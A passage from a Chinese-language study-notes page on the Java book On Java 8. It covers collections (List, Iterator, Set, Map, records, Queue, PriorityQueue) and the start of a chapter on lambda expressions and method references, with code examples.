LinkedList&lt;&gt;();//但向上转型并不是总是可以,因为显现类会有自己的方法,而接口中没有LinkedList&lt;Apple&gt; apples = new LinkedList&lt;&gt;();</code></pre><ul><li><p>序列是持有一组对象的一种方式,Collection接口是序列概念的一般化</p></li><li><p>Java集合类库有着完整的体系结构,根接口即为Collection和Map</p></li></ul><p><img src="/images/PL/OnJava8/12_2.webp" alt></p><h3 id="12.3-%E6%B7%BB%E5%8A%A0%E4%B8%80%E7%BB%84%E5%85%83%E7%B4%A0" tabindex="-1">12.3 添加一组元素</h3><ul><li>java.util 中的 Arrays 和 Collections 类都包含了一些工具方法，用于向一个 Collection中添加一组元素<ul><li>Arrays.asList() 方法:接受一个数组或是用逗号分隔的元素列表，并将其转换为一个 List 对象;底层为数组,无法修改大小</li><li>Collections.addAll() 方法:接受一个 Collection 对象，以及一个数组或是一个用逗号分隔的列表，然后将元素添加到 Collection 中</li></ul></li></ul><pre><code class="language-java">Collection&lt;Integer&gt; collection = new ArrayList&lt;&gt;(Arrays.asList(1, 2, 3, 4, 5));Integer[] moreInts = &#123; 6, 7, 8, 9, 10 &#125;;collection.addAll(Arrays.asList(moreInts));// 运行快很多，但是我们无法以这种方式构建 Collection：Collections.addAll(collection, 11, 12, 13, 14, 15);Collections.addAll(collection, moreInts);// 生成一个底层为数组的列表：List&lt;Integer&gt; list = Arrays.asList(16,17,18,19,20);list.set(1, 99); // OK——修改元素 // list.add(21); // 运行时错误；底层的数组不能调整大小</code></pre><h3 id="12.4-%E9%9B%86%E5%90%88%E6%89%93%E5%8D%B0" tabindex="-1">12.4 集合打印</h3><pre><code class="language-java">public class PrintingCollections &#123;  static Collection  fill(Collection&lt;String&gt; collection) &#123;    collection.add(&quot;rat&quot;);    collection.add(&quot;cat&quot;);    collection.add(&quot;dog&quot;);    collection.add(&quot;dog&quot;);    return collection;  &#125;  static Map fill(Map&lt;String, String&gt; map) &#123;    map.put(&quot;rat&quot;, &quot;Fuzzy&quot;);    map.put(&quot;cat&quot;, &quot;Rags&quot;);    map.put(&quot;dog&quot;, &quot;Bosco&quot;);    map.put(&quot;dog&quot;, &quot;Spot&quot;);    return map;  &#125;  public static void main(String[] args) &#123;    System.out.println(fill(new ArrayList&lt;&gt;()));    System.out.println(fill(new LinkedList&lt;&gt;()));    System.out.println(fill(new HashSet&lt;&gt;()));    System.out.println(fill(new TreeSet&lt;&gt;()));    System.out.println(fill(new LinkedHashSet&lt;&gt;()));    System.out.println(fill(new HashMap&lt;&gt;()));    System.out.println(fill(new TreeMap&lt;&gt;()));    System.out.println(fill(new LinkedHashMap&lt;&gt;()));  &#125;&#125;/* Output:[rat, cat, dog, dog][rat, cat, dog, dog][rat, cat, dog][cat, dog, rat][rat, cat, dog]&#123;rat=Fuzzy, cat=Rags, dog=Spot&#125;&#123;cat=Rags, dog=Spot, rat=Fuzzy&#125;&#123;rat=Fuzzy, cat=Rags, dog=Spot&#125;*/</code></pre><ul><li>集合类可以很漂亮的进行打印,通过toString方法,Collection的内容用方括号包起来,Map的内容用花括号包起来,键值对用等号连接,并且按照键的升序排列</li><li>上述代码展示了Java集合类库的两种主要类型,区别是集合中每个&quot;槽&quot;(slot)内持有的条目数<ul><li>Collection:每个槽只能持有一个元素<ul><li>List:按照插入顺序保存元素<ul><li>ArrayList和LinkedList</li></ul></li><li>Set:不能有重复元素<ul><li>HashSet</li><li>TreeSet:以升序保存对象</li><li>LinkedHashSet:按照添加顺序来保存对象</li></ul></li><li>Queue:按照排队规则来确定对象产生的顺序</li></ul></li><li>Map:每个槽持有两个对象,一个是键,一个是值,键用来查找值<ul><li>HashMap:保存顺序不同于插入顺序</li><li>TreeMap:按照键的升序来排序</li><li>LinkedHashMap:按照插入顺序来保存键，同时保留了 HashMap 的查找速度</li></ul></li></ul></li></ul><h3 id="12.5-list" tabindex="-1">12.5 List</h3><ul><li><p>List接口在Collection基础上增加方法,支持在List中间插入和删除元素,有两种基本类型的List</p><ul><li>基本的ArrayList,擅长随机访问元素,但在List中间插入和删除元素比较慢</li><li>LinkedList,提供了理想的顺序访问性能,在List中间插入和删除元素比较快,但随机访问元素比较慢</li></ul></li><li><p>List 方法</p><ul><li>contains(Object):判断是否包含某个对象</li><li>remove(Object):删除某个对象</li><li>indexOf(Object):返回某个对象的索引</li><li>equals(Object):判断是否相等,两个对象相等的条件是:1.类型相同 2.长度相同 3.每个位置的元素都相同,使用equals()方法判断,而不是==,因为==判断的是对象的引用</li><li>subList(int fromIndex, int toIndex):返回一个子列表,包含fromIndex到toIndex之间的元素,不包含toIndex,即左闭右开</li><li>containsAll(Collection):判断是否包含某个集合中的所有元素</li><li>addAll(Collection):添加某个集合中的所有元素</li><li>removeAll(Collection):删除某个集合中的所有元素</li><li>retainAll(Collection):删除不在某个集合中的所有元素,即取交集</li><li>clear():删除所有元素</li><li>isEmpty():判断是否为空</li><li>toArray():返回一个包含所有元素的数组</li><li>set(int index, E element):将index位置的元素替换为element</li></ul></li><li><p>Collectons静态方法</p><ul><li>Collections.shuffle(List):随机打乱List中的元素</li><li>Collections.sort(List):按照自然顺序排序</li></ul></li></ul><h3 id="12.6-iterator" tabindex="-1">12.6 Iterator</h3><ul><li>迭代器(也是一种设计模式)的概念实现了一种抽象的接口,用来遍历容器中的元素,迭代器提供了一种通用的方式来遍历容器中的所有元素,并且不需要关心容器的具体类型</li><li>Java迭代器只能向一个方向移动,有以下几点<ul><li><ol><li>使用iterator()方法让Collection返回一个Iterator对象,该迭代器准备返回序列中的第一个元素</li></ol></li><li><ol start="2"><li>使用next()方法获得序列中的下一个元素</li></ol></li><li><ol start="3"><li>使用hasNext()方法检查序列中是否还有元素</li></ol></li><li><ol start="4"><li>使用remove()方法将迭代器新返回的元素删除</li></ol></li></ul></li></ul><pre><code class="language-java">public class SimpleIteration &#123;  public static void main(String[] args) &#123;    List&lt;Pet&gt; pets = new PetCreator().list(12);    Iterator&lt;Pet&gt; it = pets.iterator();    while(it.hasNext()) &#123;      Pet p = it.next();      System.out.print(p.id() + &quot;:&quot; + p + &quot; &quot;);    &#125;    System.out.println();    // 迭代器更简单的写法    for(Pet p : pets)      System.out.print(p.id() + &quot;:&quot; + p + &quot; &quot;);    System.out.println();    // 迭代器删除元素    it = pets.iterator();    for(int i = 0; i &lt; 6; i++) &#123;      it.next();      it.remove();    &#125;    System.out.println(pets);  &#125;&#125;</code></pre><ul><li>迭代器<strong>统一了对集合的访问</strong>;使用Iterable接口,我们可以编写能够<strong>作用于任何Collection对象</strong>的方法<ul><li>例子:下面的display()方法可以接受任何实现了Iterable接口的对象</li></ul></li></ul><pre><code class="language-java">public static void display(Iterable&lt;Pet&gt; ip) &#123;    Iterator&lt;Pet&gt; it = ip.iterator();    while(it.hasNext()) &#123;      Pet p = it.next();      System.out.print(p.id() + &quot;:&quot; + p + &quot; &quot;);    &#125;    System.out.println();&#125;public static void main(String[] args) &#123;  List&lt;Pet&gt; pets = new PetCreator().list(8);  LinkedList&lt;Pet&gt; petsLL = new LinkedList&lt;&gt;(pets);  HashSet&lt;Pet&gt; petsHS = new HashSet&lt;&gt;(pets);  TreeSet&lt;Pet&gt; petsTS = new TreeSet&lt;&gt;(pets);  display(pets);  display(petsLL);  display(petsHS);  display(petsTS);&#125;</code></pre><ul><li>ListIterator<ul><li>ListIterator是Iterator的子类型,只能用于各种List类的访问,可以双向移动</li><li>nextIndex(),previousIndex() 可以产生相对于迭代器在列表中指向的当前位置的前一个和后一个元素的索引</li><li>set()方法替换它访问过的最后一个元素</li><li>add()方法在它访问过的位置插入一个元素</li><li>listIterator(n):生成一个指向列表中索引为 n 的元素处的 ListIterator</li></ul></li></ul><pre><code class="language-java">public class ListIteration &#123;  public static void main(String[] args) &#123;    List&lt;Pet&gt; pets = new PetCreator().list(8);    ListIterator&lt;Pet&gt; it = pets.listIterator();    while(it.hasNext())      System.out.print(it.next() +        &quot;, &quot; + it.nextIndex() +        &quot;, &quot; + it.previousIndex() + &quot;; &quot;);  /*    1. 这里输出中函数调用顺序是从左到右    2. 这里需要对next实现理解,首先it.next()返回的是当前元素,然后指针向后移动一位,指向下一个元素,所以it.nextIndex()返回的其实是当前指针指向元素的索引    public E next() &#123;        if (!hasNext()) &#123;            throw new NoSuchElementException();        &#125;        E value = currentNode.getValue();        currentNode = currentNode.getNext();        return value;    &#125;  */    System.out.println();    // 反向:    while(it.hasPrevious())      System.out.print(it.previous().id() + &quot; &quot;);    System.out.println();    System.out.println(pets);    it = pets.listIterator(3);    while(it.hasNext()) &#123;      it.next();      it.set(new PetCreator().get());    &#125;    System.out.println(pets);  &#125;&#125;/* Output:Rat, 1, 0; Manx, 2, 1; Cymric, 3, 2; Mutt, 4, 3; Pug,5, 4; Cymric, 6, 5; Pug, 7, 6; Manx, 8, 7;7 6 5 4 3 2 1 0[Rat, Manx, Cymric, Mutt, Pug, Cymric, Pug, Manx][Rat, Manx, Cymric, Rat, Rat, Rat, Rat, Rat]*/</code></pre><h3 id="12.7-linkedlist" tabindex="-1">12.7 LinkedList</h3><ul><li>LinkedList是一个双向链表,可以快速地在List中间插入和删除元素,但随机访问元素比较慢,其实现了基本的List接口,也添加了一些可以用于栈,队列或双端队列的方法<ul><li><ol><li>getFirst(),element():返回列表的第一个元素,但不删除;如果列表为空,抛出NoSuchElementException;peek():返回列表的第一个元素,但不删除;如果列表为空,返回null</li></ol></li><li><ol start="2"><li>removeFirst(),remove():返回列表的第一个元素,并删除;如果列表为空,抛出NoSuchElementException;poll():返回列表的第一个元素,并删除;如果列表为空,返回null</li></ol></li><li><ol start="3"><li>addFirst():将元素插入到列表的前面;</li></ol></li><li><ol start="4"><li>addLast(),offer(),add():将元素添加到列表的末尾</li></ol></li><li><ol start="5"><li>removeLast():返回列表的最后一个元素,并删除;</li></ol></li><li>上述方法都有些微小差别,需要在使用时注意</li></ul></li></ul><h3 id="12.8-stack" tabindex="-1">12.8 Stack</h3><ul><li>Java1.0 提供了Stack类,但实现很糟糕,不过因为要向后兼容,所以一直保留了下来,但是不建议使用</li><li>Java6 加入了ArrayDeque,提供了直接实现栈功能的方法</li><li>总之,Java中java.util.Stack的栈方法不建议使用,而是使用java.util.ArrayDeque或其他方法模拟栈</li></ul><h3 id="12.9-set" tabindex="-1">12.9 Set</h3><ul><li>Set是一种不保存重复元素的Collection,Set接口没有提供额外的方法,只是限制了Collection中不能有重复元素<ul><li>HashSet使用Hash提升速度,输出的顺序没有规律</li><li>TreeSet使用红黑树实现,按照升序保存对象</li><li>LinkedHashSet按照添加顺序保存对象,也是用哈希表实现的,但是同时维护了一个链表,因此性能略低于HashSet,但是迭代访问Set中的元素时,性能比HashSet好</li></ul></li></ul><h3 id="12.10-map" tabindex="-1">12.10 Map</h3><ul><li>Map是一种关联数组,也称为字典或者是键值对,Map中的每个元素都包含一个键对象和一个值对象,每个键只能出现一次,但是可以多次出现相同的值;因此Map可以方便的扩展到多维<ul><li>Boolean containsKey(Object):判断是否包含某个键</li><li>Boolean containsValue(Object):判断是否包含某个值</li><li>V get(Object):返回某个键对应的值</li><li>V put(K key, V value):添加键值对</li><li>V remove(Object):删除某个键值对</li><li>int size():返回键值对的个数</li><li>void clear():删除所有键值对</li><li>boolean isEmpty():判断是否为空</li><li>Set<K> keySet():返回所有键组成的Set</K></li><li>Collection<V> values():返回所有值组成的Collection</V></li><li>Set&lt;Map.Entry&lt;K, V&gt;&gt; entrySet():返回所有键值对组成的Set</li><li>Map.Entry&lt;K, V&gt;:是Map中的一个内部接口,表示一个键值对,包含getKey(),getValue(),setValue()方法</li></ul></li><li>遍历Map的最佳方法,使用<code>for (Map.Entry&lt;String, Integer&gt; entry : map.entrySet())</code><ul><li><ol><li>效率高</li></ol></li><li><ol start="2"><li>简单易读</li></ol></li><li><ol start="3"><li>支持键值对操作</li></ol></li><li>但该方法返回的集合视图不可修改,修改或删除需要使用Map接口提供的其他方法</li></ul></li></ul><pre><code class="language-java">for (Map.Entry&lt;String, Integer&gt; entry : map.entrySet()) &#123;    String key = entry.getKey();    Integer value = entry.getValue();    System.out.println(&quot;Key: &quot; + key + &quot;, Value: &quot; + value);&#125;</code></pre><h3 id="12.11-%E6%96%B0%E7%89%B9%E6%80%A7%3A%E8%AE%B0%E5%BD%95(record)%E7%B1%BB%E5%9E%8B" tabindex="-1">12.11 新特性:记录(record)类型</h3><ul><li><p>Map使用的障碍:键的对象必须要定义两个函数:hashCode()和equals(),这两个函数必须要一致</p></li><li><p>JDK16 新增 record关键字.record定义的是希望称为<strong>数据传输对象</strong>(也叫<strong>数据载体</strong>)的类,使用record时,编译器自动生成</p><ul><li><ol><li>私有的final字段,用来保存每个组件的状态</li></ol></li><li><ol start="2"><li>公共的构造器,用来初始化每个组件的状态</li></ol></li><li><ol start="3"><li>公共的访问器方法,用来访问每个组件的状态</li></ol></li><li><ol start="4"><li>equals()方法,用来比较两个记录是否相等</li></ol></li><li><ol start="5"><li>hashCode()方法,用来生成记录的哈希码</li></ol></li><li><ol start="6"><li>toString()方法,用来生成记录的字符串表示形式</li></ol></li></ul></li><li><p>例子:</p></li></ul><pre><code class="language-java">import java.util.*;record Employee(String name, int id) &#123;&#125;public class BasicRecord &#123;  public static void main(String[] args) &#123;    var bob = new Employee(&quot;Bob Dobbs&quot;, 11);    var dot = new Employee(&quot;Dorothy Gale&quot;, 9);    // bob.id = 12; // 错误:    // id 在 Employee 中的访问权限为 private    System.out.println(bob.name()); // 访问器    System.out.println(bob.id()); // 访问器    System.out.println(bob); // toString()    //  Employee 可以用做 Map 中的键：    var map = Map.of(bob, &quot;A&quot;, dot, &quot;B&quot;);    System.out.println(map);  &#125;&#125;/* Output:Bob Dobbs11Employee[name=Bob Dobbs, id=11]&#123;Employee[name=Dorothy Gale, id=9]=B, Employee[name=Bob Dobbs, id=11]=A&#125;*/</code></pre><ul><li>record只需要名字和参数即可<ul><li><ol><li>参数自动变为 private final 的字段</li></ol></li><li><ol start="2"><li>不能再record内部定义字段,但可以加入静态的字段,初始值</li></ol></li><li><ol start="3"><li>可以定义方法,但只能使用参数,不能修改,因为参数是final的</li></ol></li></ul></li><li>record不能继承或者被继承,其隐含为final的,但可以实现接口<ul><li>例子:编译器会强制我们实现density()方法,但不会因为brightness()方法而报错,因为brightness()方法在record<strong>自动生成</strong>的访问器中已经实现了</li></ul></li></ul><pre><code class="language-java">interface Star &#123; double brightness(); double density();&#125;record RedDwarf(double brightness) implements Star &#123; @Override public double density() &#123; return 100.0; &#125;&#125;</code></pre><ul><li>record可以被嵌套和局部使用,此时record都是静态的</li><li>record会自动创建一个规范的构造器,但我们可以使用**紧凑构造器(compact)**来添加构造器行为<ul><li>紧凑构造器的参数必须是record的参数,且必须在record的参数之后</li><li>紧凑构造器常用来验证参数,或者是对参数进行修改,也可以调用外部函数</li><li>例子:下面的紧凑构造器会将id的值加1</li></ul></li></ul><pre><code class="language-java">record Employee(String name, int id) &#123;  Employee &#123;    if (id &lt; 1) throw new IllegalArgumentException();    id++;  &#125;&#125;</code></pre><ul><li>也可以使用普通构造器语法替换掉自动生成的构造器,构造器必须精确复制这个 record 的签名,但是必须使用this()调用自动生成的构造器,</li></ul><pre><code class="language-java">record Employee(String name, int id) &#123;  Employee(String name) &#123;    this.name = name;  &#125;&#125;</code></pre><h3 id="12.12-queue" tabindex="-1">12.12 Queue</h3><ul><li><p>Queue是一个典型的先进先出(FIFO)的容器,Queue接口继承了Collection接口,并添加了一些额外的方法</p><ul><li><ol><li>add():将元素插入到队尾,如果插入成功,返回true,否则抛出异常</li></ol></li><li><ol start="2"><li>offer():将元素插入到队尾,如果插入成功,返回true,否则返回false</li></ol></li><li><ol start="3"><li>remove():返回队头元素,如果队列为空,抛出异常</li></ol></li><li><ol start="4"><li>poll():返回队头元素,如果队列为空,返回null</li></ol></li><li><ol start="5"><li>element():返回队头元素,如果队列为空,抛出异常</li></ol></li><li><ol start="6"><li>peek():返回队头元素,如果队列为空,返回null</li></ol></li></ul></li><li><p>LinkedList实现了Queue接口,因此可以直接使用LinkedList来实现队列</p></li></ul><pre><code class="language-java">public class QueueDemo &#123;  public static void printQ(Queue queue) &#123;    while(queue.peek() != null)      System.out.print(queue.remove() + &quot; &quot;);    System.out.println();  &#125;  public static void main(String[] args) &#123;    Queue&lt;Integer&gt; queue = new LinkedList&lt;&gt;();    Random rand = new Random(47);    for(int i = 0; i &lt; 10; i++)      queue.offer(rand.nextInt(i + 10));    printQ(queue);    Queue&lt;Character&gt; qc = new LinkedList&lt;&gt;();    for(char c : &quot;Brontosaurus&quot;.toCharArray())      qc.offer(c);    printQ(qc);  &#125;&#125;</code></pre><h4 id="priorityqueue" tabindex="-1">PriorityQueue</h4><ul><li>Java5中添加PriorityQueue,为Queue的优先队列的实现,其内部使用堆来实现,可以使用Comparator来控制元素的排序</li></ul><pre><code class="language-java">PriorityQueue&lt;Integer&gt; priorityQueue = new PriorityQueue&lt;&gt;();priorityQueue = new PriorityQueue&lt;&gt;(Arrays.asList(1, 2, 3, 4, 5, 6, 7));priorityQueue = new PriorityQueue&lt;&gt;(size, Collections.reverseOrder());//这里即使用了Comparator,使用了Collections.reverseOrder()来反转排序priorityQueue = new PriorityQueue&lt;&gt;(comparator);//使用自己定义的比较器Comparator&lt;Integer&gt; comparator = new Comparator&lt;Integer&gt;() &#123;  @Override public int compare(Integer o1, Integer o2) &#123;    return o2 - o1;  &#125;&#125;;</code></pre><h3 id="12.13-collection%E5%92%8Citerator" tabindex="-1">12.13 Collection和Iterator</h3><ul><li><p>Collection接口是所有Collection类的根接口,它提供了一组标准的集合操作,包括添加,删除,查找,遍历等;此外,java.util.AbstractCollection类提供了Collection接口的默认实现,以减少实现Collection接口所需的工作量</p></li><li><p>C<ins>标准库中的集合类没有公共基类,集合之间共性通过迭代器实现,Java也遵循C</ins>的方式,但Java中Collection接口继承了Iterable接口,所以Java中实现Collection也就意味着有了Iterator()方法</p></li></ul><pre><code class="language-java">public static &lt;T&gt; void display(Iterator&lt;T&gt; it) &#123;  while(it.hasNext()) &#123;    T obj = it.next();    System.out.print(obj.toString() + &quot; &quot;);  &#125;  System.out.println();&#125;public static &lt;T&gt; void display(Collection&lt;T&gt; collection) &#123;  for(T obj : collection)    System.out.print(obj.toString() + &quot; &quot;);  System.out.println();&#125;</code></pre><ul><li>上面两个版本的display()方法都可以接受任何Collection对象,但是第一个版本使用了Iterator,因此可以用于任何实现了Iterable接口的对象,而第二个版本只能用于Collection对象</li><li>当有一个不是Collection的外部类时,我们可以让它实现Iterable接口,这样就可以使用适合Iterable接口的语法了<ul><li>生成一个Iterator, 是将序列与处理序列的方法连接起来的耦合性最低的方式，与实现 Collection 相比，这样做对序列类的约束要少得多。</li></ul></li></ul><pre><code class="language-java">class PetSequence &#123;  protected Pet[] pets = new PetCreator().array(8);&#125;public class NonCollectionSequence extends PetSequence &#123;  public Iterator&lt;Pet&gt; iterator() &#123;    return new Iterator&lt;Pet&gt;() &#123;      private int index = 0;      @Override public boolean hasNext() &#123;        return index &lt; pets.length;      &#125;      @Override      public Pet next() &#123; return pets[index++]; &#125;      @Override      public void remove() &#123; // Not implemented        throw new UnsupportedOperationException();      &#125;    &#125;;  &#125;  public static void main(String[] args) &#123;    NonCollectionSequence nc =      new NonCollectionSequence();    InterfaceVsIterator.display(nc.iterator());  &#125;&#125;</code></pre><h3 id="12.14-for-in%E4%B8%8E%E8%BF%AD%E4%BB%A3%E5%99%A8" tabindex="-1">12.14 for-in与迭代器</h3><ul><li>for-in使用Iterable接口来遍历Collection,因此所有实现Iterable接口的类都可以使用for-in来遍历. 数组可以通过Arrays.asList()方法转换为List,从而可以使用for-in来遍历数组.</li></ul><pre><code class="language-java">public class IterableClass implements Iterable&lt;String&gt; &#123;  protected String[] words = (&quot;And that is how &quot; +    &quot;we know the Earth to be banana-shaped.&quot;    ).split(&quot; &quot;);  @Override public Iterator&lt;String&gt; iterator() &#123;    return new Iterator&lt;String&gt;() &#123;      private int index = 0;      @Override public boolean hasNext() &#123;        return index &lt; words.length;      &#125;      @Override      public String next() &#123; return words[index++]; &#125;      @Override      public void remove() &#123; // Not implemented        throw new UnsupportedOperationException();      &#125;    &#125;;  &#125;  public static void main(String[] args) &#123;    for(String s : new IterableClass())      System.out.print(s + &quot; &quot;);  &#125;&#125;public class ArrayIsNotIterable &#123;  static &lt;T&gt; void test(Iterable&lt;T&gt; ib) &#123;    for(T t : ib)      System.out.print(t + &quot; &quot;);  &#125;  public static void main(String[] args) &#123;    test(Arrays.asList(1, 2, 3));    String[] strings = &#123; &quot;A&quot;, &quot;B&quot;, &quot;C&quot; &#125;;    // An array works in for-in, but it's not Iterable:    //- test(strings);    // You must explicitly convert it to an Iterable:    test(Arrays.asList(strings));  &#125;&#125;</code></pre><h4 id="%E9%80%82%E9%85%8D%E5%99%A8%E6%96%B9%E6%B3%95" tabindex="-1">适配器方法</h4><ul><li>如何在实现Iterable接口后,让这个类有不止一种方式用在for-in语句中<ul><li>使用**适配器方法(Adapter Method)**的惯用法,即在类中添加一个返回Iterable的方法,这个方法可以用于for-in语句中</li><li>例子:下面的ReversibleArrayList类,实现了Iterable接口,并且添加了一个适配器方法,可以返回一个Iterable对象,这个对象可以用于for-in语句中;</li><li>适配器方法其实相当于给原本的方法套一个匿名内部类的皮,这个匿名内部类实现了Iterable接口,并且返回了一个Iterator对象,外部类的适配器方法返回的就是这个匿名内部类对象</li></ul></li></ul><pre><code class="language-java">public class MultiIterableClass extends IterableClass &#123;  public Iterable&lt;String&gt; reversed() &#123;    return new Iterable&lt;String&gt;() &#123;      public Iterator&lt;String&gt; iterator() &#123;        return new Iterator&lt;String&gt;() &#123;          int current = words.length - 1;          @Override public boolean hasNext() &#123;            return current &gt; -1;          &#125;          @Override public String next() &#123;            return words[current--];          &#125;          @Override          public void remove() &#123; // Not implemented            throw new UnsupportedOperationException();          &#125;        &#125;;      &#125;    &#125;;  &#125;  public Iterable&lt;String&gt; randomized() &#123;    return new Iterable&lt;String&gt;() &#123;      public Iterator&lt;String&gt; iterator() &#123;        List&lt;String&gt; shuffled =          new ArrayList&lt;&gt;(Arrays.asList(words));        Collections.shuffle(shuffled, new Random(47));        return shuffled.iterator();      &#125;    &#125;;  &#125;  public static void main(String[] args) &#123;    MultiIterableClass mic = new MultiIterableClass();    for(String s : mic.reversed())      System.out.print(s + &quot; &quot;);    System.out.println();    for(String s : mic.randomized())      System.out.print(s + &quot; &quot;);    System.out.println();    for(String s : mic)      System.out.print(s + &quot; &quot;);  &#125;&#125;</code></pre><h3 id="12.15-%E6%80%BB%E7%BB%93" tabindex="-1">12.15 总结</h3><p>Java提供了很多持有对象的方式</p><ol><li>数组将数字索引和对象关联起来.数组的效率最高,但是容量固定</li><li>Collection保存单个对象,而Map保存关联的键值对;</li></ol><ul><li>利用Java泛型可以指定保存在集合中的对象的类型</li><li>Collection和Map都可以自动调整大小</li><li>集合不能保存基本数据类型,但是可以使用基本数据类型的包装器类</li></ul><ol start="3"><li>类似数组,List也可以将数字索引和对象关联起来,但是List可以自动调整大小</li><li>如果要执行大量随机访问,使用ArrayList;如果要在列表中间执行大量删除和插入,使用LinkedList</li><li>队列和栈的行为都是通过LinkedList来实现的</li><li>Map将对象而非整型值和其他对象关联起来</li></ol><ul><li>HashMap提供了最快的查找技术</li><li>TreeMap将键有序保存,不如HashMap快</li><li>LinkedMap按照元素插入的顺序保存键,但通过Hash提供了快速访问能力</li></ul><ol start="7"><li>对于相同元素,Set只保存一个</li></ol><ul><li>HashSet提供了最快的查找技术</li><li>TreeSet将键有序保存</li><li>LinkedSet按照元素插入的顺序保存键</li></ul><ol start="8"><li>不要在新代码中使用Vector,HashTable和Stack等遗留类</li></ol><ul><li><p>Java集合类的简化图(没有抽象类或遗留组件),只包含常见接口和类</p><ul><li>虚线框表示接口,实现框为实现类,最常用集合边框加粗</li><li>箭头表示继承关系,实现类实现了接口</li><li>带有&quot;Produces&quot;的箭头标明一个类可以生成箭头所指类的对象<br><img src="/images/PL/OnJava8/12_15.png" alt></li></ul></li><li><p>从面向对象的层次结构看，这种组织方式有点奇怪。然而随着你对 java.util 中的集合类有了更深入的了解,会有更多的问题,而不只是奇怪的继承结构.设计集合类库总是存在各种困难，我们要满足往往存在冲突的不同诉求。所以要准备好在这里或那里做出一些妥协</p></li></ul><h2 id="13-%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B" tabindex="-1">13 函数式编程</h2><ul><li>早期,为了让程序适应有限的内存,程序员会在<strong>程序执行时</strong>修改内存中的代码,来节省代码空间.这就是<strong>自修改代码技术</strong></li><li>然而随着程序越来复杂,代码需要更加一致和易懂,并且硬件越来便宜,自修改代码的方法已经落后.然而代码操纵其它代码的思想依然很吸引人,但需要更安全的实现</li><li>这就是<strong>函数式编程</strong>(functional programming,FP)的意义所在,它是一种编程范式,可以将计算机运算视为数学函数的计算,避免了状态和可变数据,强调函数的<strong>运算结果</strong>而非<strong>运算过程</strong>,以及<strong>函数之间的调用关系</strong>来解决问题</li><li><strong>面向对象编程抽象数据,函数式编程抽象行为</strong></li><li><strong>纯函数式语言</strong>要求所有数据是<strong>不可变的</strong>,函数接收值,然后产生新值,而不是修改参数的值,因此纯函数式语言中的函数没有副作用,也就是说,函数不会修改外部的状态,也不会依赖外部的状态,函数的输出只依赖于输入,这样的函数称为<strong>纯函数</strong>(pure function)</li></ul><h3 id="13.1-%E6%96%B0%E6%96%B9%E5%BC%8F%E5%92%8C%E6%97%A7%E6%96%B9%E5%BC%8F" tabindex="-1">13.1 新方式和旧方式</h3><ul><li>旧方式:创建一个对象,让其一个方法包含所需行为,然后将这个对象传递给另一个方法,这个方法可以调用对象的方法来执行所需的行为</li><li>Java8的新方式:方法引用和lambda表达式</li></ul><h3 id="13.2-lambda%E8%A1%A8%E8%BE%BE%E5%BC%8F" tabindex="-1">13.2 lambda表达式</h3><ul><li><strong>lambda表达式</strong>是使用尽可能少的语法编写的函数定义</li><li>在JVM中,所有都是对象,所以lambda也是一个对象,所以使用lambda表达式时,实际上是创建了一个对象,这个对象是一个函数式接口的实例</li><li>lambda表达式基础语法<ul><li><ol><li>参数</li></ol></li><li><ol start="2"><li>后面跟 -&gt; ,可以称作&quot;产生&quot;(produces)</li></ol></li><li><ol start="3"><li>-&gt;后都是方法体</li></ol></li></ul></li></ul><pre><code class="language-java">interface Description &#123;  String brief();&#125;interface Body &#123;  String detailed(String head);&#125;interface Multi &#123;  String twoArg(String head, Double d);&#125;public class LambdaExpressions &#123;  static Body bod = h -&gt; h + &quot; No Parens!&quot;;      // [1]  static Body bod2 = (h) -&gt; h + &quot; More details&quot;; // [2]  static Description desc = () -&gt; &quot;Short info&quot;;  // [3]  static Multi mult = (h, n) -&gt; h + n;           // [4]  static Description moreLines = () -&gt; &#123;         // [5]    System.out.println(&quot;moreLines()&quot;);    return &quot;from moreLines()&quot;;  &#125;;  public static void main(String[] args) &#123;    System.out.println(bod.detailed(&quot;Oh!&quot;));    System.out.println(bod2.detailed(&quot;Hi!&quot;));    System.out.println(desc.brief());    System.out.println(mult.twoArg(&quot;Pi! &quot;, 3.14159));    System.out.println(moreLines.brief());  &#125;&#125;/* Output:Oh! No Parens!Hi! More detailsShort infoPi! 3.14159moreLines()from moreLines()*/</code></pre><ul><li>上述代码中,[1] 到 [5]的lambda实现了接口中的方法<ul><li>[1] [2] 只有一个参数,可以省略参数的括号,但为了一致性,最好加上</li><li>[3] 没有参数,需要使用括号</li><li>[4] 有多个参数,需要使用括号,且用&quot;,&quot;隔开,需要注意参数类型的一致性</li><li>[1]到[4]的方法体只有一行,此时方法式中表达式的结果会自动成为lambda表达式的返回值,此处使用return关键字非法,</li><li>[5] 如果lambda表达式需要多行代码,此时必须将代码放在花括号中,此时需要使用return关键字来返回值</li></ul></li></ul><h4 id="%E9%80%92%E5%BD%92" tabindex="-1">递归</h4><ul><li>Java中可以编写递归的lambda表达式,但此时该lambda表达式必须给赋值给一个静态变量或一个实例变量,否则会出现编译错误</li><li>例子:此处主函数里fact是一个静态InCall变量,需要注意的是,这里不能直接使用lambda表达式,而是需要先声明一个变量,然后再使用lambda表达式赋值给这个变量,因为lambda表达式是一个对象,而不是一个方法</li></ul><pre><code class="language-java">interface IntCall &#123;  int call(int arg);&#125;public class RecursiveFactorial &#123;  static IntCall fact;  // static IntCall fact = n -&gt; n == 0 ? 1 : n * fact.call(n - 1); 这样会编译错误,对Java编译器太过复杂  public static void main(String[] args) &#123;    fact = n -&gt; n == 0 ? 1 : n * fact.call(n - 1);    for(int i = 0; i &lt;= 10; i++)      System.out.println(fact.call(i));  &#125;&#125;</code></pre><h3 id="13.3-%E6%96%B9%E6%B3%95%E5%BC%95%E7%94%A8" tabindex="-1">13.3 方法引用</h3><ul><li>方法引用是用 类名或对象名后跟 ::,然后方法名</li></ul><pre><code class="language-java">interface Callable &#123;                        // [1] 是一个包含一个方法的接口  void call(String s);&#125;class Describe &#123;  void show(String msg) &#123;                   // [2] show的**签名**(参数类型和返回类型) 和Callable中call()的签名一致    System.out.println(msg);  &#125;&#125;public class MethodReferences &#123;  static void hello(String name) &#123;          // [3] hello()的签名和Callable中call()的签名一致    System.out.println(&quot;Hello, &quot; + name);  &#125;  static class Description &#123;    String about;    Description(String desc) &#123; about = desc; &#125;    void help(String msg) &#123;                 // [4] help()的签名和Callable中call()的签名一致,为静态内部类的非静态方法      System.out.println(about + &quot; &quot; + msg);    &#125;  &#125;  static class Helper &#123;    static void assist(String msg) &#123;        // [5] assist()的签名和Callable中call()的签名一致,为静态内部类的静态方法      System.out.println(msg);    &#125;  &#125;  public static void main(String[] args) &#123;    Describe d = new Describe();    Callable c = d::show;                   // 